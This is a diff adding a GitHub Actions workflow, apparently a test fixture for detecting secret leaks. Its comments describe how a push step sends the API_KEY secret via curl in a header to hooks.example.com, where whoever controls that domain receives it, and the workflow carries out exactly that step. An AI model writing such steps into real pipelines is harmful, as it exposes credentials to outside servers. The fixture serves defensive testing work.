@@ -1,0 +1,20 @@
+# situation: on push, a step defines a function that sends its argument in a
+#   header to hooks.example.com, and calls the function with the secret
+#   API_KEY.
+# reason: the key goes to hooks.example.com through the argument of the
+#   function, and whoever holds that server receives the key.
+# attack: the attacker takes over the server of the destination, by a breach
+#   of the vendor or by registering the domain when the domain lapses.
+# attack-run-behavior: the workflow sends the request as it always does, and
+#   the server, now the attacker's, logs the value of API_KEY.
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - shell: bash
+        env:
+          API_KEY: ${{ secrets.API_KEY }}
+        run: |
+          send() { curl -fsS -H "x-apikey: $1" https://hooks.example.com/; }
+          send "$API_KEY"
